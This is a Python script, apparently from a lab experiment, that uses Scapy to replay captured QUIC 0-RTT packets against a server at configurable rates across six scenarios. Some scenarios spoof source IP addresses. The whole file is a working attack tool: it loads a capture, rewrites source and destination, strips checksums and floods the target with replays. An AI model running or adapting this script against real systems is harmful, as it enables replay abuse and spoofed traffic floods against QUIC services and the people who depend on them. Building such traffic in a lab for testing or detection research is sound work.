#!/usr/bin/env python3
"""
QUIC 0-RTT Replay Attack Script (Fixed)
"""

from scapy.all import *
import time
import sys
import random
import logging

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
conf.verb = 0

class ReplayAttacker:
    def __init__(self, pcap_file, target_ip="192.168.204.128", target_port=4433):
        self.target_ip = target_ip
        self.target_port = target_port
        self.iface = "ens33"  
        self.packets = self._load_packets(pcap_file)
        print(f"[*] Loaded {len(self.packets)} packets")
    
    def _load_packets(self, pcap_file):
        pkts = rdpcap(pcap_file)
        filtered = [p for p in pkts 
                    if UDP in p and p[UDP].dport == self.target_port]
        print(f"[*] Filtered {len(filtered)} packets to server")
        return filtered
    
    def _send_one_replay(self, src_ip=None):
        for pkt in self.packets:
            new_pkt = pkt.copy()
            if src_ip:
                new_pkt[IP].src = src_ip
            new_pkt[IP].dst = self.target_ip
            del new_pkt[IP].chksum
            del new_pkt[UDP].chksum
            sendp(new_pkt, iface=self.iface, verbose=False)
    
    def attack(self, scenario, duration_sec, pkt_per_window, multi_source=False):
        packets_per_replay = len(self.packets)
        replays_per_window = max(1, pkt_per_window // packets_per_replay)
        delay = 0.5 / replays_per_window
        
        if multi_source:
            src_ips = ["192.168.204.130", "192.168.204.131"]
        else:
            src_ips = [None]
        
        print(f"\n{'='*60}")
        print(f"[{scenario}] 0-RTT Replay Attack")
        print(f"{'='*60}")
        print(f"  Duration    : {duration_sec}초")
        print(f"  목표        : {pkt_per_window} pkt/0.5s")
        print(f"  Interface   : {self.iface}")
        print(f"{'='*60}")
        
        input("\nEnter 누르면 공격 시작...")
        print("\n[*] 공격 시작!")
        
        start_time = time.time()
        replay_count = 0
        pkt_count = 0
        
        try:
            while (time.time() - start_time) < duration_sec:
                src_ip = random.choice(src_ips) if multi_source else None
                self._send_one_replay(src_ip=src_ip)
                replay_count += 1
                pkt_count += packets_per_replay
                
                if replay_count % 50 == 0:
                    elapsed = time.time() - start_time
                    pps = pkt_count / elapsed if elapsed > 0 else 0
                    print(f"  [{scenario}] Replay: {replay_count}, Pkts: {pkt_count}, PPS: {pps:.1f}")
                
                time.sleep(delay)
                
        except KeyboardInterrupt:
            print(f"\n[!] 중단됨")
        
        elapsed = time.time() - start_time
        print(f"\n[{scenario}] 완료! Pkts: {pkt_count}, 시간: {elapsed:.1f}초")
        return pkt_count


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 replay_attack.py [A1|A2|A3|A4|A5|A6]")
        sys.exit(1)
    
    scenario = sys.argv[1].upper()
    
    attacker = ReplayAttacker(
        pcap_file="/root/0rtt_original.pcap",
        target_ip="192.168.204.128",
        target_port=4433
    )
    
    configs = {
        "A1": {"duration_sec": 1000, "pkt_per_window": 20,  "multi_source": False},
        "A2": {"duration_sec": 1000, "pkt_per_window": 80,  "multi_source": False},
        "A3": {"duration_sec": 1000, "pkt_per_window": 220, "multi_source": False},
        "A4": {"duration_sec": 1000, "pkt_per_window": 20,  "multi_source": True},
        "A5": {"duration_sec": 1000, "pkt_per_window": 80,  "multi_source": True},
        "A6": {"duration_sec": 1000, "pkt_per_window": 220, "multi_source": True},
    }
    
    if scenario not in configs:
        print(f"Unknown: {scenario}")
        sys.exit(1)
    
    attacker.attack(scenario, **configs[scenario])
